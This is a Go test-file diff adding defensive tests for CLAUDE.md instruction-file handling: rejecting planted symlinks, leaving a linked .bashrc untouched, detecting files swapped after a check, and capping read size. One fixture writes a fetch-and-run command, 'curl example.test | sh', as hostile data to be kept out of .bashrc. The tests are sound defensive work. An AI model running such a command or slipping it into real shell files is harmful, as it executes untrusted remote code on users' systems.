@@ -3,6 +3,8 @@ package tools
 import (
 	"os"
 	"path/filepath"
+	"runtime"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -130,6 +132,20 @@ func TestMergedInstructions(t *testing.T) {
 }
 
 func TestPrepareInstructionsSnapshot(t *testing.T) {
+	t.Run("planted symlink at the host path is refused", func(t *testing.T) {
+		// Arrange
+		target := filepath.Join(t.TempDir(), "secret")
+		require.NoError(t, os.WriteFile(target, []byte("test-secret\n"), 0o600))
+		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
+		symlinkOrSkip(t, target, hostPath)
+
+		// Act
+		_, err := PrepareInstructionsSnapshot(hostPath, "block")
+
+		// Assert
+		assert.ErrorContains(t, err, "not a regular file")
+	})
+
 	t.Run("host file does not exist yet", func(t *testing.T) {
 		// Arrange
 		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
@@ -211,6 +227,25 @@ func TestPrepareInstructionsSnapshot(t *testing.T) {
 }
 
 func TestFinalizeInstructionsSnapshot(t *testing.T) {
+	t.Run("planted symlink at the host path is replaced, not written through", func(t *testing.T) {
+		// Arrange
+		target := filepath.Join(t.TempDir(), ".bashrc")
+		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
+		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
+		symlinkOrSkip(t, target, hostPath)
+		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
+		require.NoError(t, os.WriteFile(snapshotPath, []byte("curl example.test | sh\n"), 0o640))
+
+		// Act
+		err := FinalizeInstructionsSnapshot(hostPath, snapshotPath)
+
+		// Assert
+		require.NoError(t, err)
+		got, err := os.ReadFile(target)
+		require.NoError(t, err)
+		assert.Equal(t, "original\n", string(got))
+	})
+
 	t.Run("persists the snapshot's organic content, stripping the managed block", func(t *testing.T) {
 		// Arrange
 		hostPath := filepath.Join(t.TempDir(), "CLAUDE.md")
@@ -336,5 +371,173 @@ func Test_stripManaged(t *testing.T) {
 
 		// Assert
 		assert.Equal(t, existing, rest)
+	})
+}
+
+func Test_readInstructions(t *testing.T) {
+	t.Run("missing file reads as empty", func(t *testing.T) {
+		// Act
+		content, err := readInstructions(filepath.Join(t.TempDir(), "CLAUDE.md"))
+
+		// Assert
+		require.NoError(t, err)
+		assert.Empty(t, content)
+	})
+
+	t.Run("regular file is read", func(t *testing.T) {
+		// Arrange
+		path := filepath.Join(t.TempDir(), "CLAUDE.md")
+		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))
+
+		// Act
+		content, err := readInstructions(path)
+
+		// Assert
+		require.NoError(t, err)
+		assert.Equal(t, "note\n", content)
+	})
+
+	t.Run("symlink is refused", func(t *testing.T) {
+		// Arrange
+		target := filepath.Join(t.TempDir(), "secret")
+		require.NoError(t, os.WriteFile(target, []byte("test-secret\n"), 0o600))
+		path := filepath.Join(t.TempDir(), "CLAUDE.md")
+		symlinkOrSkip(t, target, path)
+
+		// Act
+		_, err := readInstructions(path)
+
+		// Assert
+		assert.ErrorContains(t, err, "not a regular file")
+	})
+}
+
+func Test_writeInstructions(t *testing.T) {
+	t.Run("planted symlink is replaced, its target untouched", func(t *testing.T) {
+		// Arrange
+		target := filepath.Join(t.TempDir(), ".bashrc")
+		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
+		path := filepath.Join(t.TempDir(), "CLAUDE.md")
+		symlinkOrSkip(t, target, path)
+
+		// Act
+		err := writeInstructions(path, "note\n")
+
+		// Assert
+		require.NoError(t, err)
+		got, err := os.ReadFile(target)
+		require.NoError(t, err)
+		assert.Equal(t, "original\n", string(got))
+		info, err := os.Lstat(path)
+		require.NoError(t, err)
+		assert.True(t, info.Mode().IsRegular())
+	})
+
+	t.Run("written file gets mode 0640", func(t *testing.T) {
+		// Arrange
+		if runtime.GOOS == "windows" {
+			t.Skip("windows has no unix modes")
+		}
+		path := filepath.Join(t.TempDir(), "CLAUDE.md")
+
+		// Act
+		err := writeInstructions(path, "note\n")
+
+		// Assert
+		require.NoError(t, err)
+		info, err := os.Stat(path)
+		require.NoError(t, err)
+		assert.Equal(t, os.FileMode(0o640), info.Mode().Perm())
+	})
+}
+
+func Test_ensureHostFile(t *testing.T) {
+	t.Run("missing file is created empty", func(t *testing.T) {
+		// Arrange
+		path := filepath.Join(t.TempDir(), "data", "CLAUDE.md")
+
+		// Act
+		err := ensureHostFile(path)
+
+		// Assert
+		require.NoError(t, err)
+		got, err := os.ReadFile(path)
+		require.NoError(t, err)
+		assert.Empty(t, got)
+	})
+
+	t.Run("dangling symlink is refused without creating its target", func(t *testing.T) {
+		// Arrange
+		target := filepath.Join(t.TempDir(), "new-file")
+		path := filepath.Join(t.TempDir(), "CLAUDE.md")
+		symlinkOrSkip(t, target, path)
+
+		// Act
+		err := ensureHostFile(path)
+
+		// Assert
+		assert.ErrorContains(t, err, "not a regular file")
+		assert.NoFileExists(t, target)
+	})
+}
+
+func Test_openRegular(t *testing.T) {
+	dir := t.TempDir()
+
+	t.Run("checked regular file opens", func(t *testing.T) {
+		// Arrange
+		path := filepath.Join(dir, "CLAUDE.md")
+		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))
+		checked, err := os.Lstat(path)
+		require.NoError(t, err)
+
+		// Act
+		f, err := openRegular(path, checked)
+
+		// Assert
+		require.NoError(t, err)
+		_ = f.Close()
+	})
+
+	t.Run("file swapped after the check is refused", func(t *testing.T) {
+		// Arrange
+		path := filepath.Join(dir, "swapped.md")
+		require.NoError(t, os.WriteFile(path, []byte("note\n"), 0o640))
+		checked, err := os.Lstat(path)
+		require.NoError(t, err)
+		other := filepath.Join(dir, "other.md")
+		require.NoError(t, os.WriteFile(other, []byte("other\n"), 0o640))
+		require.NoError(t, os.Rename(other, path))
+
+		// Act
+		_, err = openRegular(path, checked)
+
+		// Assert
+		assert.ErrorContains(t, err, "changed while reading it")
+	})
+}
+
+func Test_readCapped(t *testing.T) {
+	t.Run("content up to the cap is read", func(t *testing.T) {
+		// Arrange
+		content := strings.Repeat("a", maxInstructionsBytes)
+
+		// Act
+		got, err := readCapped(strings.NewReader(content), "CLAUDE.md")
+
+		// Assert
+		require.NoError(t, err)
+		assert.Len(t, got, maxInstructionsBytes)
+	})
+
+	t.Run("content over the cap is refused", func(t *testing.T) {
+		// Arrange
+		content := strings.Repeat("a", maxInstructionsBytes+1)
+
+		// Act
+		_, err := readCapped(strings.NewReader(content), "CLAUDE.md")
+
+		// Assert
+		assert.ErrorContains(t, err, "is larger than")
 	})
 }
